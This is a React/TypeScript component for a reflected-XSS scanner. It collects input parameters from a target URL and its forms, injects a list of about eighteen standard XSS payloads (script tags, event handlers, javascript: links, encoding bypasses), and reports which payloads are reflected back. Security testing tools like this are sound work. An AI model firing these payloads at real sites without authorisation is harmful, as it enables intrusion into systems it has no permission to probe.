import { useState } from "react";
import { motion } from "framer-motion";
import {
  ArrowLeft,
  Search,
  Loader2,
  Globe,
  CheckCircle,
  XCircle,
  Copy,
  Check,
  AlertTriangle,
  Eye,
  Shield,
  RefreshCw,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";

import { proxyFetch } from "@/lib/proxyFetch";

// ─── XSS Payloads ────────────────────────────────────────────────────────────

const XSS_PAYLOADS = [
  // Basic script injection
  { payload: '<script>alert(1)</script>', label: "Script Tag", severity: "critical" as const },
  { payload: '<script>alert(document.domain)</script>', label: "Script Domain", severity: "critical" as const },
  // Event handler injection
  { payload: '<img src=x onerror=alert(1)>', label: "Img onerror", severity: "critical" as const },
  { payload: '<svg onload=alert(1)>', label: "SVG onload", severity: "critical" as const },
  { payload: '<body onload=alert(1)>', label: "Body onload", severity: "critical" as const },
  // Attribute breakout
  { payload: '" onfocus="alert(1)" autofocus="', label: "Attribute Break", severity: "high" as const },
  { payload: "' onmouseover='alert(1)' '", label: "Event Handler", severity: "high" as const },
  { payload: '" onmouseover="alert(1)"', label: "Mouseover", severity: "high" as const },
  // HTML injection
  { payload: '<h1>XSS</h1>', label: "HTML Tag", severity: "medium" as const },
  { payload: '<iframe src="javascript:alert(1)">', label: "Iframe JS", severity: "critical" as const },
  { payload: '<a href="javascript:alert(1)">click</a>', label: "JS Link", severity: "high" as const },
  // Encoding bypasses
  { payload: '&lt;script&gt;alert(1)&lt;/script&gt;', label: "HTML Entity", severity: "medium" as const },
  { payload: '%3Cscript%3Ealert(1)%3C/script%3E', label: "URL Encoded", severity: "medium" as const },
  // Template injection
  { payload: '{{7*7}}', label: "Template Literal", severity: "low" as const },
  { payload: '${7*7}', label: "Template Expr", severity: "low" as const },
  // SVG + CSS
  { payload: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>', label: "SVG Animate", severity: "critical" as const },
  { payload: '<details open ontoggle=alert(1)>', label: "Details Toggle", severity: "critical" as const },
  // Null byte / mutation
  { payload: '<scr\x00ipt>alert(1)</scr\x00ipt>', label: "Null Byte", severity: "medium" as const },
];

type Severity = "critical" | "high" | "medium" | "low";

interface XssFinding {
  parameter: string;
  payload: string;
  label: string;
  severity: Severity;
  reflected: boolean;
  context: string; // where it was reflected
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

function isHtmlResponse(text: string): boolean {
  const t = text.toLowerCase().trim();
  return t.startsWith("<!doctype") || t.startsWith("<html");
}

/** Extract parameter names from URL query string */
function extractUrlParams(urlStr: string): string[] {
  try {
    const u = new URL(urlStr);
    return Array.from(u.searchParams.keys());
  } catch {
    return [];
  }
}

/** Extract form input names from HTML */
function extractFormParams(html: string): string[] {
  const names = new Set<string>();
  // Match name="..." and name='...' attributes on input/textarea/select
  const nameRegex = /(?:input|textarea|select)[^>]*\bname=["']([^"']+)["']/gi;
  let m;
  while ((m = nameRegex.exec(html)) !== null) {
    names.add(m[1]);
  }
  // Match hidden inputs
  const hiddenRegex = /type=["']hidden["'][^>]*\bname=["']([^"']+)["']/gi;
  while ((m = hiddenRegex.exec(html)) !== null) {
    names.add(m[1]);
  }
  return Array.from(names);
}

/** Check if payload string appears in response (exact or partial) */
function isPayloadReflected(response: string, payload: string): { found: boolean; context: string } {
  // Check exact
  if (response.includes(payload)) {
    const idx = response.indexOf(payload);
    const start = Math.max(0, idx - 40);
    const end = Math.min(response.length, idx + payload.length + 40);
    const snippet = response.substring(start, end).replace(/</g, "&lt;").replace(/>/g, "&gt;");
    return { found: true, context: `...${snippet}...` };
  }
  // Check partial (for encoded variants)
  const stripped = payload.replace(/<|>|"|'|&lt;|&gt;|&amp;/g, "");
  if (stripped.length > 3 && response.includes(stripped)) {
    return { found: true, context: `Partial match: "${stripped}" found in response` };
  }
  return { found: false, context: "" };
}

async function safeFetch(url: string, timeoutMs = 15000): Promise<string> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const res = await proxyFetch(url, { signal: controller.signal });
    clearTimeout(timer);
    if (!res.ok && res.headers.get("x-proxy-error")) throw new Error(`HTTP ${res.status}`);
    const text = await res.text();
    if (!isHtmlResponse(text)) throw new Error("Response is not HTML");
    return text;
  } catch (err) {
    clearTimeout(timer);
    throw err;
  }
}

// ─── UI Components ───────────────────────────────────────────────────────────

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <button onClick={handleCopy} className="text-xs text-muted-foreground hover:text-cyan transition-colors">
      {copied ? <Check className="size-3 text-emerald" /> : <Copy className="size-3" />}
    </button>
  );
}

const severityColors: Record<Severity, string> = {
  critical: "border-red/40 text-red bg-red/5",
  high: "border-amber/40 text-amber bg-amber/5",
  medium: "border-cyan/40 text-cyan bg-cyan/5",
  low: "border-muted-foreground/40 text-muted-foreground bg-muted/5",
};

// ─── Main Component ──────────────────────────────────────────────────────────

interface XssScannerProps {
  onBack: () => void;
}

export function XssScanner({ onBack }: XssScannerProps) {
  const [url, setUrl] = useState("");
  const [scanning, setScanning] = useState(false);
  const [findings, setFindings] = useState<XssFinding[]>([]);
  const [paramsFound, setParamsFound] = useState<string[]>([]);
  const [error, setError] = useState<string | null>(null);
  const [scanTime, setScanTime] = useState<number | null>(null);
  const [progress, setProgress] = useState({ current: 0, total: 0 });
  const [scannedParams, setScannedParams] = useState(0);

  const cleanUrl = (input: string) => {
    let u = input.trim();
    if (!u.startsWith("http")) u = `https://${u}`;
    return u;
  };

  const handleScan = async () => {
    if (!url.trim()) return;
    const target = cleanUrl(url);
    setUrl(target);
    setScanning(true);
    setFindings([]);
    setParamsFound([]);
    setError(null);
    setScanTime(null);
    setScannedParams(0);
    const startTime = Date.now();

    try {
      // Step 1: Fetch the target page
      const html = await safeFetch(target);

      // Step 2: Discover parameters from URL + forms
      const urlParams = extractUrlParams(target);
      const formParams = extractFormParams(html);
      const allParams = [...new Set([...urlParams, ...formParams])];

      if (allParams.length === 0) {
        setError("No input parameters found. Add query parameters to the URL (e.g., ?q=test) or the page must contain HTML forms.");
        setScanTime(Date.now() - startTime);
        setScanning(false);
        return;
      }

      setParamsFound(allParams);
      setProgress({ current: 0, total: allParams.length * XSS_PAYLOADS.length });

      // Step 3: Test each parameter with each payload
      const allFindings: XssFinding[] = [];

      for (let pi = 0; pi < allParams.length; pi++) {
        const param = allParams[pi];
        setScannedParams(pi + 1);

        for (let pai = 0; pai < XSS_PAYLOADS.length; pai++) {
          const { payload, label, severity } = XSS_PAYLOADS[pai];
          setProgress({
            current: pi * XSS_PAYLOADS.length + pai + 1,
            total: allParams.length * XSS_PAYLOADS.length,
          });

          try {
            // Build test URL
            const testUrl = new URL(target);
            testUrl.searchParams.set(param, payload);

            const response = await safeFetch(testUrl.toString(), 10000);
            const { found, context } = isPayloadReflected(response, payload);

            if (found) {
              allFindings.push({
                parameter: param,
                payload,
                label,
                severity,
                reflected: true,
                context,
              });
            }
          } catch {
            // Skip failed requests silently
          }

          // Small delay
          await new Promise((r) => setTimeout(r, 150));
        }
      }

      setFindings(allFindings);
      setScanTime(Date.now() - startTime);
    } catch (err) {
      setError(
        err instanceof Error ? err.message : "Failed to fetch target. Check the URL and try again."
      );
    } finally {
      setScanning(false);
    }
  };

  const criticalCount = findings.filter((f) => f.severity === "critical").length;
  const highCount = findings.filter((f) => f.severity === "high").length;
  const mediumCount = findings.filter((f) => f.severity === "medium").length;

  return (
    <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.3 }} className="min-h-full">
      <div className="max-w-5xl mx-auto px-4 sm:px-6 py-8">
        <Button variant="ghost" size="sm" onClick={onBack} className="gap-2 mb-6 text-muted-foreground hover:text-foreground">
          <ArrowLeft className="size-4" /> Back to Dashboard
        </Button>

        {/* Header */}
        <div className="flex flex-col sm:flex-row items-start gap-6 mb-8">
          <div className="flex size-16 items-center justify-center rounded-2xl shrink-0 bg-red/10">
            <Eye className="size-8 text-red" />
          </div>
          <div className="flex-1 min-w-0">
            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight mb-2">XSS Scanner</h1>
            <p className="text-muted-foreground text-base">
              Tests input parameters for reflected XSS by injecting {XSS_PAYLOADS.length} payloads and
              checking for reflection in the response HTML.
            </p>
          </div>
        </div>

        {/* Input */}
        <div className="glass-card rounded-2xl p-6 mb-6">
          <label className="text-sm font-medium mb-3 block">Target URL</label>
          <div className="flex gap-3">
            <div className="flex-1 relative">
              <Globe className="absolute left-3 top-1/2 -translate-y-1/2 size-4 text-muted-foreground" />
              <Input
                type="url"
                placeholder="https://example.com/search?q=test"
                value={url}
                onChange={(e) => setUrl(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && !scanning && handleScan()}
                className="pl-10"
                disabled={scanning}
              />
            </div>
            <Button onClick={handleScan} disabled={scanning || !url.trim()} className="gap-2 bg-red hover:bg-red/90 text-white font-semibold">
              {scanning ? <Loader2 className="size-4 animate-spin" /> : <Search className="size-4" />}
              {scanning ? "Scanning..." : "Scan XSS"}
            </Button>
          </div>
          <p className="text-[11px] text-muted-foreground mt-2">
            Include a parameter in the URL (e.g., <code>?q=test</code>) or the page must contain HTML forms.
          </p>
        </div>

        {/* Progress */}
        {scanning && (
          <div className="glass-card rounded-xl p-4 mb-6">
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs text-muted-foreground">
                Testing {scannedParams}/{paramsFound.length || "?"} parameters — {progress.current}/{progress.total} payloads
              </span>
            </div>
            <div className="w-full h-2 bg-muted rounded-full overflow-hidden">
              <motion.div
                className="h-full bg-red rounded-full"
                animate={{ width: `${progress.total > 0 ? (progress.current / progress.total) * 100 : 0}%` }}
                transition={{ duration: 0.3 }}
              />
            </div>
          </div>
        )}

        {/* Error */}
        {error && (
          <div className="glass-card rounded-xl p-4 border border-red/20 mb-6">
            <div className="flex items-start gap-3">
              <XCircle className="size-4 text-red shrink-0 mt-0.5" />
              <p className="text-sm text-muted-foreground">{error}</p>
            </div>
          </div>
        )}

        {/* Results */}
        {findings.length > 0 && (
          <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-4">
            {/* Summary */}
            <div className="flex flex-wrap items-center gap-4 text-xs text-muted-foreground">
              <span>Target: <code className="text-red">{url}</code></span>
              {scanTime && <span>Scan time: {(scanTime / 1000).toFixed(1)}s</span>}
              <span>Parameters: {paramsFound.length}</span>
              <span className="text-red font-medium">{findings.length} vulnerabilities</span>
            </div>

            {/* Severity Badges */}
            <div className="flex gap-3 flex-wrap">
              {criticalCount > 0 && <Badge className="bg-red/10 text-red border-red/30 text-xs">🔴 {criticalCount} Critical</Badge>}
              {highCount > 0 && <Badge className="bg-amber/10 text-amber border-amber/30 text-xs">🟠 {highCount} High</Badge>}
              {mediumCount > 0 && <Badge className="bg-cyan/10 text-cyan border-cyan/30 text-xs">🔵 {mediumCount} Medium</Badge>}
            </div>

            {/* Findings Table */}
            <div className="glass-card rounded-2xl overflow-hidden">
              <div className="px-5 py-3 border-b border-border/50">
                <h3 className="text-sm font-semibold flex items-center gap-2">
                  <Shield className="size-4 text-red" />
                  Reflected XSS Findings
                </h3>
              </div>
              <div className="overflow-x-auto max-h-[600px] overflow-y-auto">
                <table className="w-full text-sm">
                  <thead className="sticky top-0 bg-card z-10">
                    <tr className="border-b border-border/50">
                      <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">Parameter</th>
                      <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">Payload</th>
                      <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">Severity</th>
                      <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">Context</th>
                      <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">Copy</th>
                    </tr>
                  </thead>
                  <tbody>
                    {findings.map((f, i) => (
                      <tr key={`${f.parameter}-${f.payload}-${i}`} className="border-b border-border/30 last:border-0 hover:bg-muted/30 transition-colors">
                        <td className="px-5 py-2.5">
                          <code className="text-cyan font-mono text-xs">{f.parameter}</code>
                        </td>
                        <td className="px-5 py-2.5">
                          <code className="text-xs font-mono text-muted-foreground break-all">{f.payload.substring(0, 60)}{f.payload.length > 60 ? "..." : ""}</code>
                          <span className="text-[10px] text-muted-foreground ml-2">{f.label}</span>
                        </td>
                        <td className="px-5 py-2.5">
                          <Badge variant="outline" className={`text-[10px] ${severityColors[f.severity]}`}>
                            {f.severity}
                          </Badge>
                        </td>
                        <td className="px-5 py-2.5">
                          <code className="text-[10px] text-muted-foreground font-mono break-all">{f.context.substring(0, 80)}</code>
                        </td>
                        <td className="px-5 py-2.5">
                          <CopyButton text={`${f.parameter}: ${f.payload}`} />
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </motion.div>
        )}

        {/* No findings after scan */}
        {!scanning && findings.length === 0 && paramsFound.length > 0 && !error && (
          <div className="glass-card rounded-2xl p-8 text-center border border-emerald/20">
            <CheckCircle className="size-10 text-emerald mx-auto mb-3" />
            <p className="text-sm font-medium text-emerald mb-1">No XSS vulnerabilities detected</p>
            <p className="text-xs text-muted-foreground">
              Tested {paramsFound.length} parameter{paramsFound.length !== 1 ? "s" : ""} with {XSS_PAYLOADS.length} payloads.
              The target may be sanitizing input or encoding output.
            </p>
          </div>
        )}

        {/* Info */}
        <div className="glass-card rounded-xl p-4 border border-amber/20 mt-6">
          <div className="flex items-start gap-3">
            <AlertTriangle className="size-4 text-amber shrink-0 mt-0.5" />
            <div className="text-xs text-muted-foreground">
              <p>
                <strong className="text-foreground">How it works:</strong> Fetches the
                target page, extracts parameters from URL query strings and HTML forms,
                then injects {XSS_PAYLOADS.length} XSS payloads into each parameter. The
                response is checked for payload reflection. Severity is classified by
                payload type (script execution = critical, event handlers = high, HTML
                injection = medium, template syntax = low).
              </p>
              <p className="mt-1 text-amber">
                <strong>Educational use only.</strong> Only scan targets you own or have
                explicit authorization to test.
              </p>
            </div>
          </div>
        </div>
      </div>
    </motion.div>
  );
}
